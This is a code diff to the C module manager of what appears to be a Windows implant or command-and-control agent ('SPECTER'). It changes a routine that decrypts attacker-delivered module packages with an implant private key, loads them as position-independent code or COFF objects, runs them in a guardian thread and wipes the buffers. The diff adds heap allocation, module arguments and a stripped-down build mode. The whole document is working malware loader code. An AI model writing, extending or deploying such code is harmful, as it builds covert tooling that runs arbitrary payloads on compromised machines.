@@ -18,6 +18,16 @@
 #include "ntdefs.h"
 #include "config.h"
 #include "bus.h"
+#include "heap.h"
+
+#ifdef TEST_BUILD
+#include <stdlib.h>
+#define module_heap_alloc(size) calloc(1, (size))
+#define module_heap_free(ptr) free((ptr))
+#else
+#define module_heap_alloc(size) heap_alloc_cached((DWORD)(size))
+#define module_heap_free(ptr) heap_free_cached((ptr))
+#endif
 
 #ifndef TEST_BUILD
 #include "syscalls.h"
@@ -54,14 +64,11 @@ static void init_slot_bus(MODULE_MANAGER *mgr, DWORD slot_idx) {
     /* Reset the per-module output ring */
     output_reset(&mgr->output_rings[slot_idx]);
 
-    /* Copy the global bus API table into the per-slot copy so each
-     * module gets its own output routing.  The output function pointer
-     * is overridden to write to the per-module ring. */
-    BUS_CONTEXT *bctx = NULL;
+    /* Copy the global bus API table into the per-slot copy and bind the
+     * output function to this slot's ring. */
     IMPLANT_CONTEXT *ctx = (IMPLANT_CONTEXT *)mgr->implant_ctx;
     if (ctx && ctx->module_bus) {
-        bctx = (BUS_CONTEXT *)ctx->module_bus;
-        spec_memcpy(&mgr->slot_apis[slot_idx], &bctx->api, sizeof(MODULE_BUS_API));
+        bus_prepare_slot_api(&mgr->slot_apis[slot_idx], slot_idx);
     } else {
         spec_memset(&mgr->slot_apis[slot_idx], 0, sizeof(MODULE_BUS_API));
     }
@@ -96,7 +103,8 @@ NTSTATUS modmgr_init(IMPLANT_CONTEXT *ctx) {
 /*  modmgr_execute — verify → decrypt → load → execute                 */
 /* ------------------------------------------------------------------ */
 
-int modmgr_execute(MODULE_MANAGER *mgr, const BYTE *package, DWORD len) {
+int modmgr_execute(MODULE_MANAGER *mgr, const BYTE *package, DWORD len,
+                   const BYTE *args, DWORD args_len) {
     if (!mgr || !mgr->initialized || !package || len == 0)
         return -1;
 
@@ -132,7 +140,9 @@ int modmgr_execute(MODULE_MANAGER *mgr, const BYTE *package, DWORD len) {
 #endif
 
     /* 2. Decrypt the package */
-    BYTE plaintext[MODULE_MAX_SIZE];
+    BYTE *plaintext = (BYTE *)module_heap_alloc(MODULE_MAX_SIZE);
+    if (!plaintext)
+        return -1;
     DWORD plaintext_len = MODULE_MAX_SIZE;
 
 #ifndef TEST_BUILD
@@ -144,7 +154,8 @@ int modmgr_execute(MODULE_MANAGER *mgr, const BYTE *package, DWORD len) {
     }
 
     if (!loader_decrypt_package(package, len, implant_privkey, plaintext, &plaintext_len)) {
-        spec_memset(plaintext, 0, sizeof(plaintext));
+        spec_memset(plaintext, 0, MODULE_MAX_SIZE);
+        module_heap_free(plaintext);
         return -1;
     }
 #else
@@ -152,6 +163,7 @@ int modmgr_execute(MODULE_MANAGER *mgr, const BYTE *package, DWORD len) {
     const BYTE *payload = package + sizeof(MODULE_PACKAGE_HDR);
     plaintext_len = hdr->encrypted_size;
     if (plaintext_len > MODULE_MAX_SIZE) {
+        module_heap_free(plaintext);
         return -1;
     }
     spec_memcpy(plaintext, payload, plaintext_len);
@@ -166,25 +178,55 @@ int modmgr_execute(MODULE_MANAGER *mgr, const BYTE *package, DWORD len) {
     mod->output_ring = &mgr->output_rings[slot_idx];
     mod->bus_api = &mgr->slot_apis[slot_idx];
     mod->status = MODULE_STATUS_LOADING;
+    if (args && args_len > 0) {
+        mod->args = (BYTE *)module_heap_alloc(args_len);
+        if (!mod->args) {
+            spec_memset(plaintext, 0, plaintext_len);
+            module_heap_free(plaintext);
+            spec_memset(mod, 0, sizeof(LOADED_MODULE));
+            return -1;
+        }
+        spec_memcpy(mod->args, args, args_len);
+        mod->args_len = args_len;
+    }
 
     /* 4. Load the module (PIC or COFF) */
     PVOID entry = NULL;
     if (hdr->module_type == MODULE_TYPE_PIC) {
         entry = loader_load_pic(plaintext, plaintext_len,
                                 mod->bus_api, mod);
+#ifndef SPECTER_BAREBONE_MODULES
     } else if (hdr->module_type == MODULE_TYPE_COFF) {
         entry = loader_load_coff(plaintext, plaintext_len,
                                  mod->bus_api, mod);
+#endif
     }
 
     /* Zero the plaintext buffer */
     spec_memset(plaintext, 0, plaintext_len);
+    module_heap_free(plaintext);
 
     if (!entry) {
+        if (mod->args) {
+            spec_memset(mod->args, 0, mod->args_len);
+            module_heap_free(mod->args);
+        }
         spec_memset(mod, 0, sizeof(LOADED_MODULE));
         return -1;
     }
 
+#ifdef SPECTER_BAREBONE_MODULES
+    mod->status = MODULE_STATUS_RUNNING;
+    {
+        PIC_ENTRY_FN entry_fn = (PIC_ENTRY_FN)entry;
+        DWORD result = entry_fn(mod->bus_api, mod->args, mod->args_len);
+        (void)result;
+    }
+    if (mod->status == MODULE_STATUS_RUNNING)
+        mod->status = MODULE_STATUS_COMPLETED;
+    mgr->active_count++;
+    return slot_idx;
+#else
     /* 5. Execute in a guardian thread */
     if (!guardian_create(entry, mod->bus_api, mod)) {
         /* Failed to create guardian — clean up loaded module memory */
@@ -194,12 +236,17 @@ int modmgr_execute(MODULE_MANAGER *mgr, const BYTE *package, DWORD len) {
             spec_memset(mod->memory_base, 0, mod->memory_size);
             mod->bus_api->mem_free(mod->memory_base);
         }
+        if (mod->args) {
+            spec_memset(mod->args, 0, mod->args_len);
+            module_heap_free(mod->args);
+        }
         spec_memset(mod, 0, sizeof(LOADED_MODULE));
         return -1;
     }
 
     mgr->active_count++;
     return slot_idx;
+#endif
 }
 
 /* ------------------------------------------------------------------ */
@@ -305,6 +352,11 @@ void modmgr_cleanup(MODULE_MANAGER *mgr, DWORD slot) {
         /* TEST_BUILD: just zero the tracking (no real memory to free) */
         (void)0;
 #endif
+    }
+
+    if (mod->args && mod->args_len > 0) {
+        spec_memset(mod->args, 0, mod->args_len);
+        module_heap_free(mod->args);
     }
 
     /* Step 2: Zero the output ring for this slot */
